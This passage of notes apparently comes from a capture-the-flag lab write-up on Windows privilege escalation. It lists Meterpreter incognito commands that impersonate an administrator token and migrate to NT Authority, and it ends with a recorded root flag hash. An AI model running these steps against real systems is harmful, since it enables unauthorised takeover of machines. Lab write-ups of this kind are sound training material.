running whoami/priv we see that we have `SeImpersonatePrivilege` and `SeDebugPrivilege` enabled so we will exploit them.

for this load the incognito module

![[Pasted image 20210527163347.png]]

running `list tokens -g`

![[Pasted image 20210527163548.png]]

running
`impersonate_token "BUILTIN\Administrators"`
![[Pasted image 20210527163726.png]]

migrating to NT Authority

![[Pasted image 20210527164000.png]]

![[Pasted image 20210527164127.png]]

root == dff0f748678f280250f25a45b8046b4a


